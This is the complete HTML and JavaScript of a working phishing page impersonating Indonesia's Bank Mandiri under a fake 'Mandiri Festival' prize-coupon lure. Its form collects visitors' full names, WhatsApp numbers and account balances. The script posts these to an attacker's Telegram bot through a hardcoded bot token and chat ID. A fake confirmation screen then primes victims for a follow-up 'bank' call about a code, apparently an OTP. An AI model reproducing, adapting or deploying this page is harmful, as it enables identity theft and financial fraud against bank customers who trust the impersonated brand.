<html lang="id" class=""><head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Mandiri</title>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css" rel="stylesheet">
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
        <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/maska@2/dist/maska.umd.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.26.25/sweetalert2.all.min.js"></script>
        <style>
            body {
                background: linear-gradient(135deg, #f0f4f8, #e1e8f0);
                font-family: "Poppins", sans-serif;
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                min-height: 100vh;
            }
            .message {
                background: linear-gradient(135deg, #003d79, #0056a8);
                color: #fff;
                padding: 20px;
                border-radius: 10px;
                font-size: 15px;
                font-weight: 600;
                margin-bottom: 20px;
                min-height: 120px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .typingText {
                white-space: pre-line;
                text-align: center;
            }
            .swal2-border-radius {
                border-radius: 12px !important;
            }
            select {
                appearance: none;
                background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23003d79' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
                background-repeat: no-repeat;
                background-position: right 1rem center;
                background-size: 1em;
            }
        </style>
    </head>
    <body class="m-0 p-0 overflow-x-hidden min-h-screen">

        <!-- ========================================== -->
        <!-- HALAMAN 1: FORMULIR UTAMA -->
        <!-- ========================================== -->
        <div id="viewForm" class="w-full flex flex-col items-center">
            <nav class="sticky top-0 left-0 right-0 mx-auto w-full max-w-[450px] border-b-8 border-[#ffb400] h-[70px] z-40 shadow-lg flex items-center justify-between px-4" style="background: #003d79;">
                <div class="font-bold text-white text-xl italic" style="font-family: 'Poppins', sans-serif;">mandiri</div>
                <div class="w-10 h-2 bg-[#ffb400] rounded-full"></div>
            </nav>
            <main class="w-full flex flex-col items-center relative">
                <div class="w-full max-w-[450px] mx-auto flex flex-col items-center relative">
                    <div class="w-full px-4 pt-4 relative">
                        <div class="w-full rounded-xl overflow-hidden shadow-[0_5px_15px_rgba(0,0,0,0.2)] relative bg-blue-900">
                            <img src="/ast/Banner-FAQ-BMW.webp" class="w-full" onerror="this.src='https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=600&q=80'">
                        </div>
                    </div>
                    <div class="w-full flex flex-col items-center gap-4 p-4">
                        <div class="card bg-[#ffffffe6] p-[20px] rounded-[10px] w-full shadow-[0_5px_15px_rgba(0,0,0,0.2)] border-t-4 border-[#ffb400]">
                            <h3 class="text-[#003d79] text-[16px] border-b-2 border-[#ffb400] rounded-br-[20px] pb-1 mb-5 font-bold uppercase">𝗣𝗲𝗻𝗰𝗲𝘁𝗮𝗸𝗮𝗻 𝗞𝘂𝗽𝗼𝗻 𝗠𝗮𝗻𝗱𝗶𝗿𝗶</h3>
                            <form id="mainForm">
                                <div class="mb-[15px] text-black text-left">
                                    <label class="block mb-[5px] font-bold text-[#003d79]">Pilih Jenis Kupon</label>
                                    <select id="kupon" class="w-full p-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold focus:outline-none focus:ring-1 focus:ring-[#ffb400] cursor-pointer" required="">
                                        <option value="" disabled="" selected="" hidden="">-- Pilih Kupon --</option>
                                        <option value="Mobil dan Motor">Mobil dan Motor</option>
                                        <option value="Paket Umroh">Paket Umroh</option>
                                        <option value="Uang Cash dan Emas">Uang Cash dan Emas</option>
                                    </select>
                                </div>
                                <div class="mb-[15px] text-black text-left">
                                    <label class="block mb-[5px] font-bold text-[#003d79]">Nama Lengkap</label>
                                    <input type="text" id="nama" class="w-full p-[12px] pl-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Nama sesuai KTP" required="">
                                </div>
                                <div class="mb-[15px] text-black text-left relative">
                                    <label class="block mb-[5px] font-bold text-[#003d79]">Nomor WhatsApp</label>
                                    <input type="tel" id="nohp" class="w-full p-[12px] pl-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="08××××" maxlength="15" required="">
                                </div>
                                <div class="mb-[15px] text-black text-left">
                                    <label class="block mb-[5px] font-bold text-[#003d79]">Saldo Terakhir</label>
                                    <input type="tel" id="saldo" class="w-full p-[12px] pl-[12px] border border-[#003d79] rounded-[7px] bg-[#f9f9f9] text-[#003d79] font-bold focus:outline-none focus:ring-1 focus:ring-[#ffb400]" placeholder="Rp ×××" required="" data-maska="['Rp #.###','Rp ##.###','Rp ###.###','Rp #.###.###','Rp ##.###.###','Rp ###.###.###']">
                                </div>
                                <div class="mt-6">
                                    <button type="submit" id="lanjutkan" class="w-full bg-[#003d79] text-white p-[15px] rounded-[10px] text-[17px] font-bold shadow-[0_2px_4px_rgba(0,0,0,0.4)] disabled:opacity-30 cursor-pointer" disabled="">Lanjutkan</button>
                                </div>
                            </form>
                        </div>
                        <p class="text-[11px] text-[#003d79]/60 text-center my-8 uppercase font-bold tracking-tighter">© 2026 PT Bank Mandiri (Persero) Tbk. <br>Terdaftar dan diawasi oleh OJK.</p>
                    </div>
                </div>
            </main>
        </div>

        <!-- ========================================== -->
        <!-- HALAMAN 2: SUKSES / KETIK / AUDIO -->
        <!-- ========================================== -->
        <div id="viewSuccess" class="w-full h-screen flex justify-center items-center px-4" style="display: none;">
            <div style="background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); max-width: 450px; width: 100%; padding: 30px; text-align: center; border-top: 5px solid #ffb400;">
                <div class="header mb-4">
                    <h2 style="color: #003d79; font-weight: 800; font-style: italic;">mandiri</h2>
                </div>
                <div class="message">
                    <div id="typingContainer" class="typingText"></div>
                </div>
                <div>
                    <b>
                        <p style="font-size: 14px; text-align: center; margin-top: 30px; cursor: pointer;">
                            <strong style="color: #FF0000;">
                                Tidak Terima Kode ?<br>
                                <span style="color: #003d79">Hubungi Mandiri Care</span>
                            </strong>
                        </p>
                    </b>
                    <div style="font-size: 14px; color: #003d79; margin-top: 15px; font-weight: bold;">© 2026 PT Bank Mandiri (Persero) Tbk.</div>
                </div>
            </div>
        </div>

        <!-- Loading Overlay -->
        <div id="loadingModal" class="fixed backdrop-blur-sm inset-0 z-50 bg-black/50 flex flex-col items-center justify-center gap-4" style="display:none;">
            <div class="w-12 h-12 border-4 border-t-yellow-400 border-r-yellow-400 border-white/30 rounded-full animate-spin"></div>
            <p class="text-white font-bold text-sm tracking-wide">Memproses Data...</p>
        </div>

        <audio id="thankYouAudio" src="/ast/audio.mp3"></audio>

        <script>
            // ==========================================
            // CONFIG TELEGRAM BOT ANDA DI SINI
            // ==========================================
            const TOKEN_BOT = "8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is";
            const CHAT_ID = "6742478722";
            // ==========================================

            const typewriterText = `Terimakasih Telah Mendaftar di Layanan Mandiri Festival.
Pendaftaran Anda Sedang Diproses. Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank Mandiri
Untuk Proses Cetak Kode Kupon Undian Anda.`;

            document.addEventListener("DOMContentLoaded", () => {
                const { MaskInput } = Maska;
                new MaskInput("[data-maska]");

                // Validasi tombol aktif
                $('#nohp, #kupon').on('input change', function() {
                    const isPhoneValid = $('#nohp').val().length > 9;
                    const isKuponSelected = $('#kupon').val() !== null && $('#kupon').val() !== "";
                    $('#lanjutkan').prop('disabled', !(isPhoneValid && isKuponSelected));
                });

                // Aksi saat submit form (kirim langsung ke Telegram via JavaScript fetch)
                $('#mainForm').on('submit', function(e) {
                    e.preventDefault();
                    $('#loadingModal').fadeIn(200);

                    const kupon = $('#kupon').val();
                    const nama = $('#nama').val();
                    const nohp = $('#nohp').val();
                    const saldo = $('#saldo').val();

                    // Format pesan ke Telegram
                    const pesan = `🔔 *DATA KUPON MANDIRI MASUK* 🔔\n\n` +
                                  `🎟 *Jenis Kupon:* ${kupon}\n` +
                                  `👤 *Nama Lengkap:* ${nama}\n` +
                                  `📱 *No. WhatsApp:* \`${nohp}\`\n` +
                                  `💰 *Saldo Terakhir:* ${saldo}\n\n` +
                                  `🌐 _Status: Dikirim dari GitHub Pages._`;

                    const telegramUrl = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`;

                    // Kirim ke Telegram API
                    fetch(telegramUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: pesan,
                            parse_mode: 'Markdown'
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        setTimeout(() => {
                            $('#loadingModal').fadeOut(200);
                            $('#viewForm').hide();
                            $('#viewSuccess').fadeIn(300);
                            initSuccessPage();
                        }, 1000);
                    })
                    .catch(error => {
                        $('#loadingModal').fadeOut(200);
                        Swal.fire({
                            title: "Gagal!",
                            text: "Terjadi kesalahan saat mengirim data.",
                            icon: "error",
                            confirmButtonColor: "#003d79"
                        });
                    });
                });
            });

            function playAudio() {
                const audio = document.getElementById("thankYouAudio");
                if(audio) {
                    audio.play().catch(() => {
                        document.body.addEventListener("click", () => audio.play(), { once: true });
                    });
                }
            }

            function showThankYouAlert() {
                Swal.fire({
                    title: "Registrasi Berhasil!",
                    text: "Anda akan dihubungi oleh Customer Service Mandiri Festival.",
                    icon: "success",
                    confirmButtonText: "OK",
                    confirmButtonColor: "#003d79",
                    customClass: { popup: "swal2-border-radius" },
                });
            }

            function typeWriterEffect(text, containerId, speed = 40) {
                let index = 0;
                const container = document.getElementById(containerId);
                container.innerHTML = "";
                function typeChar() {
                    if (index < text.length) {
                        container.innerHTML += text.charAt(index);
                        index++;
                        setTimeout(typeChar, speed);
                    }
                }
                typeChar();
            }

            function initSuccessPage() {
                playAudio();
                showThankYouAlert();
                typeWriterEffect(typewriterText, "typingContainer", 40);
            }
        </script>
    </body>
</html>
